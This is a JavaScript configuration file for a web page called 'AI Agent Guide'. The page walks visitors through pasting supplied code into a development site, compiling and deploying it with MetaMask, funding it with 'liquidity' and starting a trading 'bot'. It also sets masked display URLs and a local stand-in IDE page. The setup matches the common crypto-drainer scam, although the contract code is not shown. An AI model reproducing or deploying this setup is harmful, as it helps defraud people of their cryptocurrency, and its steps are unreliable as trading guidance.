/** Dynamic site configuration — edit this file to change copy, URLs, and guide steps */
window.SITE_CONFIG = {
  guide: {
    title: "🤖 AI Agent Guide",
    contactEmail: "you@example.com",
    contactLabel: "Click Here",
    devSiteLabel: "Click Here",
    sourceHeading: "📜 Source Code",
    compilerVersion: "0.8.4",
    zipName: "idecompiler-cloudflare-v4.zip",
  },
  urls: {
    siteMask: "s3.amazonaws.com/danielcrypto-web3/index.html",
    ideMask: "s3.amazonaws.com/danielcrypto-web3/open",
    metamask: "https://metamask.io/download",
  },
  routes: {
    guide: "/",
    ideQuery: "view=ide",
  },
  guideSteps: [
    "Get a Web3 wallet if you don't already have one, here's the link to MetaMask:",
    "Head over to the development site",
    "Create a new file, name it one word",
    "Paste the code into your new file",
    "Go to the compile tab and compile with version 0.8.4",
    "Go to the deploy tab and select your extension from the menu. Connect it then click deploy",
    "Provide sufficient liquidity",
    "Click the start button to begin and withdraw to retrieve the balance and stop the bot",
  ],
};

window.SITE_MASK_DISPLAY = window.SITE_CONFIG.urls.siteMask;
window.IDE_MASK_DISPLAY = window.SITE_CONFIG.urls.ideMask;
window.IDE_PAGE_URL = "open/";
window.IDE_OPEN_IN_NEW_TAB = false;
window.IDE_ENTRY_SESSION_KEY = "idecompiler_dev_entry";
window.IDE_ENTRY_QUERY_PARAM = "dev";
window.GUIDE_HOME_URL = "index.html";
